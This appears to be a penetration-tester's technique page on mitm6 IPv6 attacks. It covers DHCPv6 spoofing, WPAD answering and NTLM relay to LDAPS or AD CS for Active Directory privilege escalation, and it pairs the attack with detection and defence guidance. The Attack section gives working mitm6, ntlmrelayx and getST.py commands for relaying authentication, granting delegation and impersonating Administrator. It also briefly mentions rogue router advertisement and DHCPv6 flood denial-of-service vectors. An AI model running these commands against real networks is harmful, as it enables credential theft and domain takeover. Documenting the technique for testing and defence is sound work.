---
title: "IPv6 Attacks (mitm6 / DHCPv6 / SLAAC)"
type: technique
tags: [network, ipv6, mitm6, relay, coercion, lateral-movement, active-directory]
phase: exploitation
date_created: 2026-06-18
date_updated: 2026-06-18
sources: [fox-it-mitm6, dirkjanm-ntlmrelayx-ipv6]
---

# IPv6 Attacks (mitm6 / DHCPv6 / SLAAC)

## What it is

Windows enables IPv6 by default and prefers it over IPv4, but most networks run no IPv6 DHCP/DNS server. An attacker answers the unanswered IPv6 traffic: spoof DHCPv6 to assign victims an IPv6 address and set the attacker as their **DNS server**, then resolve internal names (WPAD, the domain) to the attacker and relay the captured NTLM authentication into Active Directory. One of the highest-reliability unauthenticated internal-network -> domain-privesc paths. No CVE; it is a default-config flaw. Pairs with [[internal-ntlm-relay]], [[adcs]] (ESC8), [[responder]].

## How it works

1. `mitm6` sends spoofed DHCPv6 replies to every Windows host that broadcasts a DHCPv6 solicit, assigning a link-local IPv6 DNS server = the attacker.
2. Windows now sends DNS queries (including the automatic WPAD lookup) over IPv6 to the attacker.
3. Attacker answers WPAD with a proxy config, prompting the victim (or the machine account on boot/relogin) to authenticate.
4. `ntlmrelayx` relays that NTLM auth over IPv6 to LDAP/LDAPS/HTTP on a Domain Controller and performs a privileged action.

## Attack

```bash
# 1. Spoof DHCPv6 + become DNS for the target AD domain (one terminal)
mitm6 -d domain.local            # -i <iface>; -hw to target a single host MAC

# 2. Relay the captured auth to LDAPS on the DC (second terminal)
#    Default: create a new computer account + grant it RBCD over the victim (no DA needed)
ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh wpad.domain.local --delegate-access
#    Dump domain info / drop a privileged user (if a privileged session is relayed):
ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh wpad.domain.local --add-computer
```

`-wh` = WPAD host the spoofed DNS will serve. After RBCD is set on a relayed computer account, request a service ticket as any user via S4U (see [[kerberos-delegation-resource-based-constrained-delegation]]):

```bash
getST.py -spn cifs/victim.domain.local -impersonate Administrator 'domain/ATTACKERPC$:password'
```

### Relay to ADCS (ESC8) - cleaner DA path

If AD CS web enrollment is up, relay the **DC machine account** to the CA HTTP endpoint, enroll a cert as the DC, then DCSync:

```bash
ntlmrelayx.py -6 -t http://ca.domain.local/certsrv/certfnsh.asp -wh wpad.domain.local --adcs --template DomainController
# then use the cert (PKINIT) to get the DC TGT / NTLM hash -> secretsdump
```

Coercion ([[internal-coerce]] PetitPotam/PrinterBug) forces a machine to authenticate on demand instead of waiting for a natural logon - combine with mitm6/relay to skip the wait.

## Other IPv6 vectors

- **SLAAC / rogue RA**: send Router Advertisements to become the default IPv6 gateway (MITM). `RA guard` on switches mitigates.
- **DHCPv6 starvation / RA flood**: DoS (respect engagement no_dos rule before using).
- **DNS takeover via IPv6 preference**: even without DHCPv6, AAAA-record poisoning can win over IPv4 because Windows prefers IPv6.

## Detection and defence

- Disable IPv6 only if genuinely unused (Microsoft discourages full disable); otherwise block rogue DHCPv6/RA with **DHCPv6 Guard** and **RA Guard** on switches.
- **LDAP signing + channel binding (EPA)** and **SMB signing** break the relay even if spoofing succeeds (see [[internal-ntlm-relay]]).
- Disable WPAD (`WpadOverride`, set `WPAD` to a sinkhole) and the WinHTTP Web Proxy Auto-Discovery service.
- Monitor for unexpected DHCPv6 advertise/reply and a sudden flood of AAAA WPAD queries.

## Tools

`mitm6` (fox-it), `ntlmrelayx.py` ([[impacket]]), `getST.py`/`addcomputer.py` (impacket), `certipy` for the ADCS leg ([[adcs]]).

## Sources

- Fox-IT / Dirk-jan Mollema, "mitm6 - compromising IPv4 networks via IPv6" (slug: fox-it-mitm6) (`https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/`).
- Dirk-jan Mollema, "Relaying credentials everywhere with ntlmrelayx" (slug: dirkjanm-ntlmrelayx-ipv6) (`https://dirkjanm.io/`).
